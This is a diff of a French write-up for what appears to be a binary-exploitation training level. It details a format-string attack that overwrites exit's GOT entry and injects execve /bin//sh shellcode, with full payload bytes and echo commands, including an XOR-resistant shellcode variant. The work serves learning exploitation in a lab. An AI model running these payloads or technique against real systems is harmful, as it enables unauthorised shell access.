@@ -2,12 +2,13 @@
 
 | RELRO | STACK CANARY | NX | PIE | RPATH | RUNPATH | FILE |
 | :---- | :----------- | :- | :-- | :---- | :------ | :--- |
-| <span style="color:yellow">Partial RELRO</span> | <span style="color:red">No canary found</span> | <span style="color:red">NX disabled</span> | <span style="color:red">No PIE</span> | <span style="color:green">No RPATH</span> | <span style="color:green">No RUNPATH</span> | <span style="background-color:red">/home/users/level04/level04</span> |
+| <span style="color:red">No RELRO</span> | <span style="color:red">No canary found</span> | <span style="color:red">NX disabled</span> | <span style="color:red">No PIE</span> | <span style="color:green">No RPATH</span> | <span style="color:green">No RUNPATH</span> | <span style="background-color:red">/home/users/level05/level05</span> |
 
 |    |    |
 | :- | :- |
 | **Architecture** | x86 |
-| **Exploit type** | buffer overflow |
+| **Exploit type** | format string attack |
+
 
 10 %p
 
@@ -29,12 +30,76 @@ so must write at 116 octets so index 29
 0x80497e0 <exit@got.plt>:       0x08048376
 ```
 
-On doit maintenant écrire l'adresse de `shellcode ?`, `0xffffd6ac` (`4294956716` en décimal) dans `0x080497e0`.
+On doit maintenant écrire l'adresse d'un `shellcode`, `0xffffd670` (`4294956656` en décimal) dans `0x080497e0`.
 
-4294956716 - 4 = 4294956712
+Et il y a un élément de format, `%n` qui permet d'écrire le nombre de caractères écrit avant lui à l'adresse du pointeur correspontant.
 
-\xe0\x97\x04\x08%54952d%10$n
+Vu que le pointeur passé en premier prend 4 octets, on va devoir écrire `4294956652` (`4294956656 - 4`).
 
-echo $'\xe0\x97\x04\x08%54952d%10$n' > f
+Mais quand on essaye
+```
+\xe0\x97\x04\x08%4294956652d%10$n
+```
+l'adresse `0x080497e0` n'est pas changée. Mais après différents tests, ça marche avec des plus petits nombres.
 
-writes the end of d6ac in the exit got
+En fait, le nombre maximum pouvant être écrit par `%n` varie selont les implémentations mais ne dépassera pas `2147483647` (INT_MAX).
+
+Une possibilité que nous avons trouvé peut être de le faire en deux fois :
+- `0xd670` (54896) à `0x080497e0`
+- `0xffff` (65535) à `0x080497e2`
+
+Mais on obtient un segfault, car on touche aux deux octets avant `0xffff` qui sont utilisés plus tard...
+
+Mais les nombres avant sont `0x5420`, et `0x5420ffff` (1411448831) est inférieur à `INT_MAX` !
+
+Voici donc la première partie à `54896` pour la taille déjà écrite :
+Pour le second, il faut retirer les `54896` octets déjà écrits, donc `1411448831 - 54896 = 1411393935`
+
+54896 - 40 = 54856
+
+```plaintext
+\xe0\x97\x04\x08
+\xe2\x97\x04\x08
+\x31\xc9\xf7\xe1 ┐ execve /bin//sh (21 bytes + 3 nop) at 0xffffd670
+\x51\x68\x2f\x2f │
+\x73\x68\x68\x2f │
+\x62\x69\x6e\x89 │
+\xe3\xb0\x0b\xcd │
+\x80\x90\x90\x90 ┘
+\x31\xc0\x40\x89 ┐ exit (7 bytes + 1 nop)
+\xc3\xcd\x80\x90 ┘
+%54856d
+%10$n
+%10639d
+%11$n
+```
+
+`echo $'\xe0\x97\x04\x08\xe2\x97\x04\x08\x31\xc9\xf7\xe1\x51\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\xb0\x0b\xcd\x80\x90\x90\x90\x31\xc0\x40\x89\xc3\xcd\x80\x90%54856d%10$n%10639d%11$n' > f`
+
+Mais, on n'arrive pas à obtenir un shell... Et pour cause, le shellcode visible en visualisant la stack est différent et contient un `\x70` au lieu de `\x50`.
+
+Cela est dû au changement opéré sur la string récupérée, qui transforme tous les caractères entre 0x40 et 0x5A avec un xor de 0x20.
+
+Après quelques recherches, voici un shellcode qui ne sera pas impacté
+
+54896 - 40 = 54856
+```plaintext
+\xe0\x97\x04\x08
+\xe2\x97\x04\x08
+\x83\xec\x04\x31
+\xc0\x89\x04\x24
+\x68\x2f\x2f\x73
+\x68\x68\x2f\x62
+\x69\x6e\x89\xe3
+\xb0\x0b\xcd\x80
+\x31\xc0\x40\x89
+\xc3\xcd\x80\x90
+%54856d
+%10$n
+%10639d
+%11$n
+```
+
+`echo $'\xe0\x97\x04\x08\xe2\x97\x04\x08\x83\xec\x04\x31\xc0\x89\x04\x24\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\xb0\x0b\xcd\x80\x31\xc0\x40\x89\xc3\xcd\x80\x90%54856d%10$n%10639d%11$n' > f`
+
+Et ça marche dans GDB ! Mais pas sans...
